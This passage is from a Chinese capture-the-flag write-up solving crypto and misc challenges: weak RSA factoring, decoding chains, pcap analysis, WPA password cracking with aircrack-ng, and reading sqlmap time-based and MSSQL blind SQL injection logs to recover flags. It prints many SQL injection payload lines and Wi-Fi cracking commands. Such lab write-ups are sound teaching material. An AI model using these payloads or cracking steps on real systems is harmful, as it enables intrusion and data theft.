    strtmp[4] = list_base[i]
    for j in range(len(list_base)):
        strtmp[5] = list_base[j]
        for k in range(len(list_base)):
            strtmp[6] = list_base[k]
            for l in range(len(list_base)):
                strtmp[7] = list_base[l]
                strtmp_md5 = str(hashlib.md5(''.join(strtmp)).hexdigest())
                if(strtmp_md5[0 : 10] == str_md5_fore10):
                    print ''.join(strtmp), strtmp_md5
```

运行一下

```
key{BNdE} a74be8e20b51bd528d46681a19bb8560
```

flag就是key{BNdE}

### RSA破解

使用openssl解析公钥文件得到模数和公钥

```
qiqi@qiqi-Mac ~/Desktop> openssl rsa -pubin -text -modulus -in public.pem
Modulus (256 bit):
    00:a4:10:06:de:fd:37:8b:73:95:b4:e2:eb:1e:c9:
    bf:56:a6:1c:d9:c3:b5:a0:a7:35:28:52:1e:eb:2f:
    b8:17:a7
Exponent: 65537 (0x10001)
Modulus=A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7
writing RSA key
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKQQBt79N4tzlbTi6x7Jv1amHNnDtaCn
NShSHusvuBenAgMBAAE=
-----END PUBLIC KEY-----
```

公钥：`65537 (0x10001)`

模数：`A41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7`

将模数转为十进制：`74207624142945242263057035287110983967646020057307828709587969646701361764263`

使用[在线工具](http://factordb.com/)分解：

p = `258631601377848992211685134376492365269`

q = `286924040788547268861394901519826758027`

写个python脚本来解密：

```python
import gmpy2

p = 258631601377848992211685134376492365269
q = 286924040788547268861394901519826758027
e = 65537

f = int(open('flag.enc', 'rb').read().encode('hex'), 16)
print f
n = p * q
fn = (p - 1) * (q - 1)
d = gmpy2.invert(e, fn)
h = hex(gmpy2.powmod(f, d, n))[2:]
if len(h)%2 == 1:
    h = '0' + h
s = h.decode('hex')
print s
```

运行一下得到flag：`ISG{256bit_is_weak}`

### 算法问题

说实话，不知道这题干嘛的

解压得到一个py脚本和一个txt文件

打开txt文件，里面是一串数字

再打开py脚本，看到了flag，很诧异，往下看，发现是个加密算法

于是，先试着运行了一下，输出了一串数字，很眼熟，不就是txt文件里的那串数字嘛

抱着侥幸心理，猜想脚本里的flag说不定就是我们要的flag，于是拿去试一下，发现还真的是对的

key{venuscryptoissimpletodecrypt}

### RSA专家

打开压缩包，发现两个文件，用notepad++打开，有两个文件，一个是endata，另一个是aaaa，发现endata应该是一个加密文件，aaaa打开是私钥，而又根据题目名称，推断endata应该是RSA加密的，所以我们使用openssl来解密

```
qiqi@qiqi-Mac ~/Desktop> openssl rsautl -decrypt -in endata -inkey aaaa -out flag.txt
```

打开flag.txt得到flag：key{c42bcf773d54cf03}

## 杂项

### Decode1

得到一串数字，猜测是16进制的数

```
253444253534253435253335253433253641253435253737253444253531253646253738253444253434253637253442253446253534253642253442253444253534253435253738253433253641253435253737253446253531253646253738253444253434253435253442253444253534253435253332253433253641253435253738253444253531253646253738253444253534253637253442253444253534253431253738253433253641253435253738253444253431253646253738253444253534253633253442253444253534253435253331
```

所以两个数字一组，然后16进制转10进制

```
37 52 68 37 53 52 37 52 53 37 51 53 37 52 51 37 54 65 37 52 53 37 55 55 37 52 68 37 53 49 37 54 70 37 55 56 37 52 68 37 52 52 37 54 55 37 52 66 37 52 70 37 53 52 37 54 66 37 52 66 37 52 68 37 53 52 37 52 53 37 55 56 37 52 51 37 54 65 37 52 53 37 55 55 37 52 70 37 53 49 37 54 70 37 55 56 37 52 68 37 52 52 37 52 53 37 52 66 37 52 68 37 53 52 37 52 53 37 51 50 37 52 51 37 54 65 37 52 53 37 55 56 37 52 68 37 53 49 37 54 70 37 55 56 37 52 68 37 53 52 37 54 55 37 52 66 37 52 68 37 53 52 37 52 49 37 55 56 37 52 51 37 54 65 37 52 53 37 55 56 37 52 68 37 52 49 37 54 70 37 55 56 37 52 68 37 53 52 37 54 51 37 52 66 37 52 68 37 53 52 37 52 53 37 51 49  
```

接着ACSII转Char

```
%4D%54%45%35%43%6A%45%77%4D%51%6F%78%4D%44%67%4B%4F%54%6B%4B%4D%54%45%78%43%6A%45%77%4F%51%6F%78%4D%44%45%4B%4D%54%45%32%43%6A%45%78%4D%51%6F%78%4D%54%67%4B%4D%54%41%78%43%6A%45%78%4D%41%6F%78%4D%54%63%4B%4D%54%45%31
```

得到URL编码的一串字符，解码

```
MTE5CjEwMQoxMDgKOTkKMTExCjEwOQoxMDEKMTE2CjExMQoxMTgKMTAxCjExMAoxMTcKMTE1
```

又得到了一串base64编码的字符，解码

```
119 101 108 99 111 109 101 116 111 118 101 110 117 115 
```

再次ASCII转Char

```
welcometovenus
```

根据题目要求，key{welcometovenus}

### 流量分析

一个pcapng包，用wireshark打开，过滤http，在最后找到了一个zip压缩包`%E6%83%85%E6%8A%A5.zip`，URL解码得到`情报.zip`

于是导出分组字节流，保存为zip压缩包，打开是一个doc文件，里面什么都没有，在其简介的注释一栏看到flag：key{23ac600a11eaffc8}

### A记录

用wireshark打开，发现被加了密

使用`aircrack-ng`进行破解，扔进kali

```
root@kali:~/Desktop# aircrack-ng shipin.cap
Opening shipin.cap
Read 16664 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)

Choosing first network as target.

Opening shipin.cap
Please specify a dictionary (option -w).


Quitting aircrack-ng...
```

发现是wpa加密，用字典爆破一下

```
root@kali:~/Desktop# aircrack-ng shipin.cap -w password.txt 
Opening shipin.cap
Read 16664 packets.

   #  BSSID              ESSID                     Encryption

   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)

Choosing first network as target.

Opening shipin.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc3


                   [00:00:00] 8 keys tested (486.23 k/s)


                           KEY FOUND! [ 88888888 ]


      Master Key     : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 
                       0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F 

      Transient Key  : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F 
                       25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C 
                       8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD 
                       2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 

      EAPOL HMAC     : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A 
```

密码是88888888

再使用`airdecap-ng`破解

```
root@kali:~/Desktop# airdecap-ng shipin.cap -e 0719 -p 88888888
Total number of packets read         16664
Total number of WEP data packets         0
Total number of WPA data packets        27
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets        16
```

发现多了一个`shipin-dec.cap`

再用wireshark打开，在过滤器中输入dns

第一个A记录是`google.com`，但并不是答案，因为它不是视频网站

所以第二个才是我们所要的，域名是：`push.m.youku.com`

所以flag是ctf{push.m.youku.com}

### Password

用wireshark打开pcap包，发现全是TCP流量，随便找一个追踪TCP流

看到`Password: backdoor…00Rm8.ate`

但有四个点不知道是什么，将显示数据选为HEX转存，我们就能看到对应的16进制编码

```
000000B9  62                                               b
000000BA  61                                               a
000000BB  63                                               c
000000BC  6b                                               k
000000BD  64                                               d
000000BE  6f                                               o
000000BF  6f                                               o
000000C0  72                                               r
000000C1  7f                                               .
000000C2  7f                                               .
000000C3  7f                                               .
000000C4  30                                               0
000000C5  30                                               0
000000C6  52                                               R
000000C7  6d                                               m
000000C8  38                                               8
000000C9  7f                                               .
000000CA  61                                               a
000000CB  74                                               t
000000CC  65                                               e
000000CD  0d                                               .
```

查询一下，`7f`是退格，`0d`是回车，所以flag就是flag{backd00Rmate}

### Decode3

jsfuck，直接扔进console里面运行一下

```
flag=itisjavascriptenjoy%21
```

URL编码解码

```
flag=itisjavascriptenjoy!
```

所以flag是key{itisjavascriptenjoy!}

### Decode8

根据提示，先拿去凯撒解密，看到这样一串字符

```
f__l4}a_gf{u_nJ_u0s.t0
```

一眼就看出来是栅栏密码了

分个组，读一下，得到flag{\_Just_4_fun_0.0_}

### 日志记录

得到一个没有后缀的文件，打开看到rar文件头，猜测是rar文件，扔到binwalk看一下，果然是，于是添加rar后缀，解压，得到一个log文件

打开，发现都是经过URL编码的，解码一下，方便我们查看

打开，是注入过程，一段一段的看，发现字段名就是flag，搜索flag关键字，从2345行开始，便是flag字段的注入过程

响应结果并没看出来有什么不同，不过每一位的判断中都有`!=`，于是猜测这个数据很有可能就是我们想要的，提取出来

```
2352 192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))!=82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2360 192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))!=79),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2368 192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index. php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))!=73),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2376 192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2384 192.168.52.1 - - [06/Nov/2015:19:33:23 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),5,1))!=123),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2392 192.168.52.1 - - [06/Nov/2015:19:33:27 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),6,1))!=109),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2400 192.168.52.1 - - [06/Nov/2015:19:33:30 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),7,1))!=105),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2408 192.168.52.1 - - [06/Nov/2015:19:33:33 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),8,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2416 192.168.52.1 - - [06/Nov/2015:19:33:36 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),9,1))!=99),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2424 192.168.52.1 - - [06/Nov/2015:19:33:41 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),10,1))!=95),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2432 192.168.52.1 - - [06/Nov/2015:19:33:43 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),11,1))!=65),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2440 192.168.52.1 - - [06/Nov/2015:19:33:48 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),12,1))!=110),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2448 192.168.52.1 - - [06/Nov/2015:19:33:54 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),13,1))!=64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2456 192.168.52.1 - - [06/Nov/2015:19:33:59 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),14,1))!=108),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2464 192.168.52.1 - - [06/Nov/2015:19:34:03 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),15,1))!=121),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2472 192.168.52.1 - - [06/Nov/2015:19:34:07 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),16,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2480 192.168.52.1 - - [06/Nov/2015:19:34:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),17,1))!=105),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2488 192.168.52.1 - - [06/Nov/2015:19:34:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),18,1))!=115),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2496 192.168.52.1 - - [06/Nov/2015:19:34:20 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),19,1))!=95),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2504 192.168.52.1 - - [06/Nov/2015:19:34:25 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),20,1))!=110),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2512 192.168.52.1 - - [06/Nov/2015:19:34:28 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),21,1))!=71),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2520 192.168.52.1 - - [06/Nov/2015:19:34:30 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),22,1))!=49),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2528 192.168.52.1 - - [06/Nov/2015:19:34:35 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),23,1))!=110),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2536 192.168.52.1 - - [06/Nov/2015:19:34:41 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),24,1))!=120),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2544 192.168.52.1 - - [06/Nov/2015:19:34:46 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),25,1))!=95),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2552 192.168.52.1 - - [06/Nov/2015:19:34:50 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),26,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2560 192.168.52.1 - - [06/Nov/2015:19:34:55 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),27,1))!=105),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2568 192.168.52.1 - - [06/Nov/2015:19:35:00 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),28,1))!=109),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2576 192.168.52.1 - - [06/Nov/2015:19:35:05 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),29,1))!=125),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"

2584 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))!=5),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
2585 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>64),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
2586 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>32),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
2587 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>16),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
2588 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>8),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
2589 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>4),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
2590 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>2),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
2591 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>1),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
```

可以得到

```
82 79 73 83 123 109 105 83 99 95 65 110 64 108 121 83 105 115 95 110 71 49 110 120 95 83 105 109 125 
```

转为字符得到ROIS{miSc_An@lySis_nG1nx_Sim}

### 注入过程

拿到是一个日志文件，打开，又根据题目，是一个注入过程，于是直接搜flag关键词，发现是查询theflag字段的详细过程

```
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),1,1))>64 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),1,1))>32 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),1,1))>48 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),1,1))>56 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),1,1))>52 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),1,1))>54 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),1,1))>53 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),2,1))>64 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),2,1))>32 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),2,1))>48 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),2,1))>56 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),2,1))>52 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),2,1))>50 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),2,1))>49 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),3,1))>64 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),3,1))>96 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),3,1))>112 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),3,1))>104 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),3,1))>100 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),3,1))>98 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),3,1))>99 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),4,1))>64 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),4,1))>32 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),4,1))>48 80 - 192.168.1.101  200 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),4,1))>56 80 - 192.168.1.101  500 0 0
UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(theflag AS NVARCHAR(4000)),CHAR(32))) FROM tourdata.dbo.news WHERE CONVERT(NVARCHAR(4000),theflag)>CHAR(32)),4,1))>52 80 - 192.168.1.101  200 0 0
